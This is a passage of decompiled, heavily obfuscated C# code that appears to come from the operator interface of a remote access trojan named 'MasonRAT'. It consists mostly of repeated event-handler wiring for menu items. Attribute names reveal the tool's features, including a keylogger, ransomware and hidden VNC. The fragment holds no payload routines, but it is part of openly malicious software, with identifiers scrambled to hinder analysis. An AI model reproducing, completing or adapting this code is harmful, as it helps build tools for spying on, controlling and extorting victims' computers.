      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060E\u060Fة\u060Dٽـ\u060Dۛحـﻼ\u060Dــ);
      ToolStripMenuItem masonRatــټۨــ̍ـۭۭ؁1 = this.\u2694️MasonRAT\u270Cــ\u060Dټۨ\u060Aــ̍ـۭۭ\u0608\u060D\u0609\u0609؁\u0609;
      if (masonRatــټۨــ̍ـۭۭ؁1 != null)
        masonRatــټۨــ̍ـۭۭ؁1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــ\u060Dټۨ\u060Aــ̍ـۭۭ\u0608\u060D\u0609\u0609؁\u0609 = value;
      ToolStripMenuItem masonRatــټۨــ̍ـۭۭ؁2 = this.\u2694️MasonRAT\u270Cــ\u060Dټۨ\u060Aــ̍ـۭۭ\u0608\u060D\u0609\u0609؁\u0609;
      if (masonRatــټۨــ̍ـۭۭ؁2 == null)
        return;
      masonRatــټۨــ̍ـۭۭ؁2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Cـــــ\u060A\u060D\u0608ڙـ\u060A
  {
    get => this.\u2694️MasonRAT\u270Cۧۚـڣڛٺط\u060Aـ\u0609ـ\u060Dـ\u060Dة;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ٽـ\u060Aۧ\u0609ٻ\u060F\u060Dٸ);
      ToolStripMenuItem masonRatۧۚـڣڛٺطـــة1 = this.\u2694️MasonRAT\u270Cۧۚـڣڛٺط\u060Aـ\u0609ـ\u060Dـ\u060Dة;
      if (masonRatۧۚـڣڛٺطـــة1 != null)
        masonRatۧۚـڣڛٺطـــة1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۧۚـڣڛٺط\u060Aـ\u0609ـ\u060Dـ\u060Dة = value;
      ToolStripMenuItem masonRatۧۚـڣڛٺطـــة2 = this.\u2694️MasonRAT\u270Cۧۚـڣڛٺط\u060Aـ\u0609ـ\u060Dـ\u060Dة;
      if (masonRatۧۚـڣڛٺطـــة2 == null)
        return;
      masonRatۧۚـڣڛٺطـــة2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0609طٻـ\u0609ـ\u060Bﻋـ\u060Bۧـ\u060Aـۡۨ\u0608
  {
    get => this.\u2694️MasonRAT\u270Cـڙ\u0608ـڙح\u060Dـحـ\u0609\u060B;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cةـڜ\u0609مٺگٺب\u0020ۧ\u060C\u060B);
      ToolStripMenuItem masonRatـڙـڙحـحـ1 = this.\u2694️MasonRAT\u270Cـڙ\u0608ـڙح\u060Dـحـ\u0609\u060B;
      if (masonRatـڙـڙحـحـ1 != null)
        masonRatـڙـڙحـحـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـڙ\u0608ـڙح\u060Dـحـ\u0609\u060B = value;
      ToolStripMenuItem masonRatـڙـڙحـحـ2 = this.\u2694️MasonRAT\u270Cـڙ\u0608ـڙح\u060Dـحـ\u0609\u060B;
      if (masonRatـڙـڙحـحـ2 == null)
        return;
      masonRatـڙـڙحـحـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڞــ\u060Ąڙةـ\u0608\u060Aۡ\u0020ـ\u0020ـ\u060Aڙـ
  {
    get => this.\u2694️MasonRAT\u270C\u0020ڙدـ\u060Dڙـد\u060Dۛـ\u0608\u060Fٻۨۧ\u0608ــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C̍\u0608ۭ\u060Dڠٻٻ\u060Bټۭـ\u060Aـۡٺ);
      ToolStripMenuItem ratڙدـڙـدۛـٻۨۧــ1 = this.\u2694️MasonRAT\u270C\u0020ڙدـ\u060Dڙـد\u060Dۛـ\u0608\u060Fٻۨۧ\u0608ــ;
      if (ratڙدـڙـدۛـٻۨۧــ1 != null)
        ratڙدـڙـدۛـٻۨۧــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0020ڙدـ\u060Dڙـد\u060Dۛـ\u0608\u060Fٻۨۧ\u0608ــ = value;
      ToolStripMenuItem ratڙدـڙـدۛـٻۨۧــ2 = this.\u2694️MasonRAT\u270C\u0020ڙدـ\u060Dڙـد\u060Dۛـ\u0608\u060Fٻۨۧ\u0608ــ;
      if (ratڙدـڙـدۛـٻۨۧــ2 == null)
        return;
      ratڙدـڙـدۛـٻۨۧــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Dـﻋ\u0609̍\u060Bــ\u060Cﯧڼةـ̍\u060Aـب\u060D\u060Dٸ
  {
    get => this.\u2694️MasonRAT\u270Cــ\u060F̍\u0609ـ\u060C\u060Aڙٺ\u0608ءم;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cىﻻﻋ\u0609ڕڼـ\u0609\u060F\u0609طـ\u0020);
      ToolStripMenuItem masonRatــ̍ـڙٺءم1 = this.\u2694️MasonRAT\u270Cــ\u060F̍\u0609ـ\u060C\u060Aڙٺ\u0608ءم;
      if (masonRatــ̍ـڙٺءم1 != null)
        masonRatــ̍ـڙٺءم1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــ\u060F̍\u0609ـ\u060C\u060Aڙٺ\u0608ءم = value;
      ToolStripMenuItem masonRatــ̍ـڙٺءم2 = this.\u2694️MasonRAT\u270Cــ\u060F̍\u0609ـ\u060C\u060Aڙٺ\u0608ءم;
      if (masonRatــ̍ـڙٺءم2 == null)
        return;
      masonRatــ̍ـڙٺءم2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cء\u0608ـژ\u060F\u0608ﻋ\u060Cּۛۏط
  {
    get => this.\u2694️MasonRAT\u270Cـاﯧ\u0609ۡڙــ\u060E\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cــڙـ\u0609\u060A\u060A\u0608ئئۡؤ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cـاﯧ\u0609ۡڙــ\u060E\u060D;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـاﯧ\u0609ۡڙــ\u060E\u060D = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cـاﯧ\u0609ۡڙــ\u060E\u060D;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٺڅٸـ\u060Dڙ\u060B\u060Dۙــڜـڙـۜـ
  {
    get => this.\u2694️MasonRAT\u270C̍\u060Cۨئۙـ\u060Eـؤ\u060D\u060Dڙ\u0609\u0608ـ\u060A\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Dڙـژ\u060Aى\u060D\u0609\u0609ـڙ؁ڙىۏ\u0609ـ);
      ToolStripMenuItem masonRat̍ۨئۙــؤڙـ1 = this.\u2694️MasonRAT\u270C̍\u060Cۨئۙـ\u060Eـؤ\u060D\u060Dڙ\u0609\u0608ـ\u060A\u060A;
      if (masonRat̍ۨئۙــؤڙـ1 != null)
        masonRat̍ۨئۙــؤڙـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C̍\u060Cۨئۙـ\u060Eـؤ\u060D\u060Dڙ\u0609\u0608ـ\u060A\u060A = value;
      ToolStripMenuItem masonRat̍ۨئۙــؤڙـ2 = this.\u2694️MasonRAT\u270C̍\u060Cۨئۙـ\u060Eـؤ\u060D\u060Dڙ\u0609\u0608ـ\u060A\u060A;
      if (masonRat̍ۨئۙــؤڙـ2 == null)
        return;
      masonRat̍ۨئۙــؤڙـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608ٺڕبٽ\u060Bـ؁ڙٻۡ\u0608ۏ
  {
    get => this.\u2694️MasonRAT\u270Cـۧـڦ\u060Bـۛ\u0608ڙټ\u060D\u0609\u0609ـ\u060C\u060C;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u060Dى\u060Dۚ\u060D\u060Aڇ\u0608ڙﻻ\u060Bةـ\u060Bٺ);
      ToolStripMenuItem masonRatـۧـڦـۛڙټـ1 = this.\u2694️MasonRAT\u270Cـۧـڦ\u060Bـۛ\u0608ڙټ\u060D\u0609\u0609ـ\u060C\u060C;
      if (masonRatـۧـڦـۛڙټـ1 != null)
        masonRatـۧـڦـۛڙټـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـۧـڦ\u060Bـۛ\u0608ڙټ\u060D\u0609\u0609ـ\u060C\u060C = value;
      ToolStripMenuItem masonRatـۧـڦـۛڙټـ2 = this.\u2694️MasonRAT\u270Cـۧـڦ\u060Bـۛ\u0608ڙټ\u060D\u0609\u0609ـ\u060C\u060C;
      if (masonRatـۧـڦـۛڙټـ2 == null)
        return;
      masonRatـۧـڦـۛڙټـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608\u0609\u060Cاـ\u0609\u060D\u060Cد\u0608؁ـ\u0609\u060F\u060Aڙڙۡۜ
  {
    get => this.\u2694️MasonRAT\u270Cــبــ\u060F\u060Fټحـــ\u060D\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cּـ\u060Dحژْڙڦ\u060C\u0608ۛ\u060Aڇْ);
      ToolStripMenuItem masonRatــبــټحـــ1 = this.\u2694️MasonRAT\u270Cــبــ\u060F\u060Fټحـــ\u060D\u060A;
      if (masonRatــبــټحـــ1 != null)
        masonRatــبــټحـــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــبــ\u060F\u060Fټحـــ\u060D\u060A = value;
      ToolStripMenuItem masonRatــبــټحـــ2 = this.\u2694️MasonRAT\u270Cــبــ\u060F\u060Fټحـــ\u060D\u060A;
      if (masonRatــبــټحـــ2 == null)
        return;
      masonRatــبــټحـــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cىد\u060Aـ\u060Aڙڠ\u060A\u060A\u060Cـۏـطـ
  {
    get => this.\u2694️MasonRAT\u270C\u060F\u060Dـب\u060Dڜـ\u0608ٺﻻ\u060Dٻڝۧ\u0608\u060D\u0608دـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060D\u0608\u0608ح\u060Eمــۧبـٸـڙۛـ؁\u060Eٽ);
      ToolStripMenuItem masonRatـبڜـٺﻻٻڝۧدـ1 = this.\u2694️MasonRAT\u270C\u060F\u060Dـب\u060Dڜـ\u0608ٺﻻ\u060Dٻڝۧ\u0608\u060D\u0608دـ;
      if (masonRatـبڜـٺﻻٻڝۧدـ1 != null)
        masonRatـبڜـٺﻻٻڝۧدـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060F\u060Dـب\u060Dڜـ\u0608ٺﻻ\u060Dٻڝۧ\u0608\u060D\u0608دـ = value;
      ToolStripMenuItem masonRatـبڜـٺﻻٻڝۧدـ2 = this.\u2694️MasonRAT\u270C\u060F\u060Dـب\u060Dڜـ\u0608ٺﻻ\u060Dٻڝۧ\u0608\u060D\u0608دـ;
      if (masonRatـبڜـٺﻻٻڝۧدـ2 == null)
        return;
      masonRatـبڜـٺﻻٻڝۧدـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ColumnHeader11")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u0608ـ\u060Eـڅ\u060Cڙـؤۜ\u060Aڙـټ\u060Aۡـٺ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("RunKeyLoggerToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڝ\u0608ۧئۡـ̍ڟ\u0609ـ\u0608 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـــ\u0609ۜڝ\u0608ڙڼؤـ
  {
    get => this.\u2694️MasonRAT\u270Cڛ\u0608ــدـ\u060Bـ\u060Aؤ̨\u060Fدـطٽمټ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۧڙ\u060Aڕژـټٺ\u060Aۡۚـْ؁ــ̍ٺٻح);
      ToolStripMenuItem ratڛــدــؤ̨دـطٽمټ1 = this.\u2694️MasonRAT\u270Cڛ\u0608ــدـ\u060Bـ\u060Aؤ̨\u060Fدـطٽمټ;
      if (ratڛــدــؤ̨دـطٽمټ1 != null)
        ratڛــدــؤ̨دـطٽمټ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڛ\u0608ــدـ\u060Bـ\u060Aؤ̨\u060Fدـطٽمټ = value;
      ToolStripMenuItem ratڛــدــؤ̨دـطٽمټ2 = this.\u2694️MasonRAT\u270Cڛ\u0608ــدـ\u060Bـ\u060Aؤ̨\u060Fدـطٽمټ;
      if (ratڛــدــؤ̨دـطٽمټ2 == null)
        return;
      ratڛــدــؤ̨دـطٽمټ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u0609ــ\u060Dؤڙڙﮪڛڙــټ̍ٺى
  {
    get => this.\u2694️MasonRAT\u270Cۙ\u060Bءڙڛټﻋبؤۙۡ\u0608ـۙٺـټ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٽژـ\u0608ـڟڣ\u0608بٺ\u060D);
      ToolStripMenuItem ratۙءڙڛټﻋبؤۙۡـۙٺـټ1 = this.\u2694️MasonRAT\u270Cۙ\u060Bءڙڛټﻋبؤۙۡ\u0608ـۙٺـټ;
      if (ratۙءڙڛټﻋبؤۙۡـۙٺـټ1 != null)
        ratۙءڙڛټﻋبؤۙۡـۙٺـټ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۙ\u060Bءڙڛټﻋبؤۙۡ\u0608ـۙٺـټ = value;
      ToolStripMenuItem ratۙءڙڛټﻋبؤۙۡـۙٺـټ2 = this.\u2694️MasonRAT\u270Cۙ\u060Bءڙڛټﻋبؤۙۡ\u0608ـۙٺـټ;
      if (ratۙءڙڛټﻋبؤۙۡـۙٺـټ2 == null)
        return;
      ratۙءڙڛټﻋبؤۙۡـۙٺـټ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙ\u0609ـڦۙڙ\u0609؁̍\u060Eۜ\u060Eۭ̍
  {
    get => this.\u2694️MasonRAT\u270Cﻋ̍ٺ\u060Dڠ\u060Cٸ\u0609\u060Fٻ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۨٽ\u060Fټـ̍ـؤ\u060Fحڙڝ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cﻋ̍ٺ\u060Dڠ\u060Cٸ\u0609\u060Fٻ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cﻋ̍ٺ\u060Dڠ\u060Cٸ\u0609\u060Fٻ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cﻋ̍ٺ\u060Dڠ\u060Cٸ\u0609\u060Fٻ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۡ\u060Dۡٺ\u0609ۚٺڕ\u060Eـ\u0020ּ̨ـــٸـ
  {
    get => this.\u2694️MasonRAT\u270Cـۛٽۏ\u060Bــ̍ٺ\u0609ـدڼ\u060Bــټ\u0608ـٺ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cﻻـ\u060D\u060A\u0609\u060D\u060Aۡب\u060D);
      ToolStripMenuItem ـۛٽۏــ̍ٺـدڼــټـٺ1 = this.\u2694️MasonRAT\u270Cـۛٽۏ\u060Bــ̍ٺ\u0609ـدڼ\u060Bــټ\u0608ـٺ;
      if (ـۛٽۏــ̍ٺـدڼــټـٺ1 != null)
        ـۛٽۏــ̍ٺـدڼــټـٺ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـۛٽۏ\u060Bــ̍ٺ\u0609ـدڼ\u060Bــټ\u0608ـٺ = value;
      ToolStripMenuItem ـۛٽۏــ̍ٺـدڼــټـٺ2 = this.\u2694️MasonRAT\u270Cـۛٽۏ\u060Bــ̍ٺ\u0609ـدڼ\u060Bــټ\u0608ـٺ;
      if (ـۛٽۏــ̍ٺـدڼــټـٺ2 == null)
        return;
      ـۛٽۏــ̍ٺـدڼــټـٺ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــ\u060Aـ\u060Dڙٽـڙ؁ــ
  {
    get => this.\u2694️MasonRAT\u270C̨\u060A\u060Dڙـڣـد\u0609دـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـۭـــڜــٺۡ\u060Bبم̨);
      ToolStripMenuItem masonRat̨ڙـڣـددـ1 = this.\u2694️MasonRAT\u270C̨\u060A\u060Dڙـڣـد\u0609دـ;
      if (masonRat̨ڙـڣـددـ1 != null)
        masonRat̨ڙـڣـددـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C̨\u060A\u060Dڙـڣـد\u0609دـ = value;
      ToolStripMenuItem masonRat̨ڙـڣـددـ2 = this.\u2694️MasonRAT\u270C̨\u060A\u060Dڙـڣـد\u0609دـ;
      if (masonRat̨ڙـڣـددـ2 == null)
        return;
      masonRat̨ڙـڣـددـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Extra2ToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـٸۧد\u0609ئﯧټڙـب̍ٺڇﮪـ\u0608ـٽ̍ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("RansomwareToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙـﻻۧ\u060A\u060Bټ\u060Bٸحﻋڜٻ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0609ـــ̍\u060C\u060Dۜڙ̨ۨڠ
  {
    get => this.\u2694️MasonRAT\u270Cۜحــ\u060Aــۙ\u0609\u0020ـۡ\u060Aۡۡﻻ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٺح\u060F\u060Eۡــ\u0608م\u060A\u060E\u060F);
      ToolStripMenuItem masonRatۜحــــۙـۡۡۡﻻ1 = this.\u2694️MasonRAT\u270Cۜحــ\u060Aــۙ\u0609\u0020ـۡ\u060Aۡۡﻻ;
      if (masonRatۜحــــۙـۡۡۡﻻ1 != null)
        masonRatۜحــــۙـۡۡۡﻻ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۜحــ\u060Aــۙ\u0609\u0020ـۡ\u060Aۡۡﻻ = value;
      ToolStripMenuItem masonRatۜحــــۙـۡۡۡﻻ2 = this.\u2694️MasonRAT\u270Cۜحــ\u060Aــۙ\u0609\u0020ـۡ\u060Aۡۡﻻ;
      if (masonRatۜحــــۙـۡۡۡﻻ2 == null)
        return;
      masonRatۜحــــۙـۡۡۡﻻ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060C\u060B\u060Cڣـۨــۚ\u060D\u0608\u060Eــ\u0609ــ
  {
    get => this.\u2694️MasonRAT\u270C\u0608؁\u0609ـۡطژ\u060Eڦژ̨\u060Eـ\u0608ـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـطﻋح\u060Fﻋـۙٽـ\u060Eـڙـژط);
      ToolStripMenuItem masonRat؁ـۡطژڦژ̨ــ1 = this.\u2694️MasonRAT\u270C\u0608؁\u0609ـۡطژ\u060Eڦژ̨\u060Eـ\u0608ـ;
      if (masonRat؁ـۡطژڦژ̨ــ1 != null)
        masonRat؁ـۡطژڦژ̨ــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608؁\u0609ـۡطژ\u060Eڦژ̨\u060Eـ\u0608ـ = value;
      ToolStripMenuItem masonRat؁ـۡطژڦژ̨ــ2 = this.\u2694️MasonRAT\u270C\u0608؁\u0609ـۡطژ\u060Eڦژ̨\u060Eـ\u0608ـ;
      if (masonRat؁ـۡطژڦژ̨ــ2 == null)
        return;
      masonRat؁ـۡطژڦژ̨ــ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("HVNCToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0609\u0608ٺۜــ\u060Fى̍\u0608گ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608\u060Aּـ\u060Fؤڝـ\u060D\u060C\u060D\u060Dۡژ
  {
    get => this.\u2694️MasonRAT\u270Cب\u0609\u060Fۛدڞ\u060Dـگ̍̍;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Aـﮪةـﻻـــ\u0020\u060Cـ̍ــْحۡ);
      ToolStripMenuItem masonRatبۛدڞـگ̍̍1 = this.\u2694️MasonRAT\u270Cب\u0609\u060Fۛدڞ\u060Dـگ̍̍;
      if (masonRatبۛدڞـگ̍̍1 != null)
        masonRatبۛدڞـگ̍̍1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cب\u0609\u060Fۛدڞ\u060Dـگ̍̍ = value;
      ToolStripMenuItem masonRatبۛدڞـگ̍̍2 = this.\u2694️MasonRAT\u270Cب\u0609\u060Fۛدڞ\u060Dـگ̍̍;
      if (masonRatبۛدڞـگ̍̍2 == null)
        return;
      masonRatبۛدڞـگ̍̍2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٻ\u0609\u060Aـژ̍حـــۡﮪـڙطدـ
  {
    get => this.\u2694️MasonRAT\u270Cﻋؤــڜ\u0609\u0609ىـــ\u060D\u0609\u060Cﮪڜ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u060Eـ\u060Dٽـــ\u0608ۧ̍ؤـڠـ\u060Aـ̍؁\u060A);
      ToolStripMenuItem masonRatﻋؤــڜىـــﮪڜ1 = this.\u2694️MasonRAT\u270Cﻋؤــڜ\u0609\u0609ىـــ\u060D\u0609\u060Cﮪڜ;
      if (masonRatﻋؤــڜىـــﮪڜ1 != null)
        masonRatﻋؤــڜىـــﮪڜ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cﻋؤــڜ\u0609\u0609ىـــ\u060D\u0609\u060Cﮪڜ = value;
      ToolStripMenuItem masonRatﻋؤــڜىـــﮪڜ2 = this.\u2694️MasonRAT\u270Cﻋؤــڜ\u0609\u0609ىـــ\u060D\u0609\u060Cﮪڜ;
      if (masonRatﻋؤــڜىـــﮪڜ2 == null)
        return;
      masonRatﻋؤــڜىـــﮪڜ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙټ\u060Aـ\u0609ء\u0609ـ\u0609\u060E\u060Aـٽ\u0608ټـ\u060Bۏ
  {
    get => this.\u2694️MasonRAT\u270C\u060C\u0608ــڞ\u0608دٽ\u060Eٻ\u060Dﻼۭۛڼ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۚ\u060Fـ\u0609ـ\u060Eڇ\u0608ـ\u060Aڙۛا\u060Aئــ\u0608\u060A);
      ToolStripMenuItem masonRatــڞدٽٻﻼۭۛڼ1 = this.\u2694️MasonRAT\u270C\u060C\u0608ــڞ\u0608دٽ\u060Eٻ\u060Dﻼۭۛڼ;
      if (masonRatــڞدٽٻﻼۭۛڼ1 != null)
        masonRatــڞدٽٻﻼۭۛڼ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060C\u0608ــڞ\u0608دٽ\u060Eٻ\u060Dﻼۭۛڼ = value;
      ToolStripMenuItem masonRatــڞدٽٻﻼۭۛڼ2 = this.\u2694️MasonRAT\u270C\u060C\u0608ــڞ\u0608دٽ\u060Eٻ\u060Dﻼۭۛڼ;
      if (masonRatــڞدٽٻﻼۭۛڼ2 == null)
        return;
      masonRatــڞدٽٻﻼۭۛڼ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cؤ\u060C؁ـــٺبـءڝـڙد\u060Aﮪ
  {
    get => this.\u2694️MasonRAT\u270Cڙـة\u060D̨\u060Eٸ\u060E\u0608ـ\u060Aﻻ\u060B̍\u0609\u0609;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609ٸــڅ\u0608ﻋ\u060Aطۭ̍ـ\u0608\u060Dڙ\u0609\u060F\u060B);
      ToolStripMenuItem masonRatڙـة̨ٸـﻻ̍1 = this.\u2694️MasonRAT\u270Cڙـة\u060D̨\u060Eٸ\u060E\u0608ـ\u060Aﻻ\u060B̍\u0609\u0609;
      if (masonRatڙـة̨ٸـﻻ̍1 != null)
        masonRatڙـة̨ٸـﻻ̍1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙـة\u060D̨\u060Eٸ\u060E\u0608ـ\u060Aﻻ\u060B̍\u0609\u0609 = value;
      ToolStripMenuItem masonRatڙـة̨ٸـﻻ̍2 = this.\u2694️MasonRAT\u270Cڙـة\u060D̨\u060Eٸ\u060E\u0608ـ\u060Aﻻ\u060B̍\u0609\u0609;
      if (masonRatڙـة̨ٸـﻻ̍2 == null)
        return;
      masonRatڙـة̨ٸـﻻ̍2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڜٺا̍ڛ\u060Dـڞــ\u0608ڣـڙ\u060F\u060C\u060A̍
  {
    get => this.\u2694️MasonRAT\u270C\u0609ﯧۭـ\u060Dڙ\u060Cڙٻـ\u060Bۏ\u0608ڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۡ\u060Fٸــمٺۡـڙ);
      ToolStripMenuItem masonRatﯧۭـڙڙٻـۏڙ1 = this.\u2694️MasonRAT\u270C\u0609ﯧۭـ\u060Dڙ\u060Cڙٻـ\u060Bۏ\u0608ڙ;
      if (masonRatﯧۭـڙڙٻـۏڙ1 != null)
        masonRatﯧۭـڙڙٻـۏڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609ﯧۭـ\u060Dڙ\u060Cڙٻـ\u060Bۏ\u0608ڙ = value;
      ToolStripMenuItem masonRatﯧۭـڙڙٻـۏڙ2 = this.\u2694️MasonRAT\u270C\u0609ﯧۭـ\u060Dڙ\u060Cڙٻـ\u060Bۏ\u0608ڙ;
      if (masonRatﯧۭـڙڙٻـۏڙ2 == null)
        return;
      masonRatﯧۭـڙڙٻـۏڙ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060A\u060Dـۙٻ\u060Aـ\u0020ؤـ\u0608\u060A\u060Aـ\u060E\u0609ؤټ\u060E
  {
    get => this.\u2694️MasonRAT\u270Cاـ\u060Aۡـٸ̨\u060Aژڙڝد\u060Cد\u060Dـ\u060Cڠ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609\u060F\u0608ۭ\u0020ڜٻ\u060Aحڙ\u060Fڙڼ\u0608\u060Aٺد\u060C);
      ToolStripMenuItem ratاـۡـٸ̨ژڙڝددـڠ1 = this.\u2694️MasonRAT\u270Cاـ\u060Aۡـٸ̨\u060Aژڙڝد\u060Cد\u060Dـ\u060Cڠ;
      if (ratاـۡـٸ̨ژڙڝددـڠ1 != null)
        ratاـۡـٸ̨ژڙڝددـڠ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cاـ\u060Aۡـٸ̨\u060Aژڙڝد\u060Cد\u060Dـ\u060Cڠ = value;
      ToolStripMenuItem ratاـۡـٸ̨ژڙڝددـڠ2 = this.\u2694️MasonRAT\u270Cاـ\u060Aۡـٸ̨\u060Aژڙڝد\u060Cد\u060Dـ\u060Cڠ;
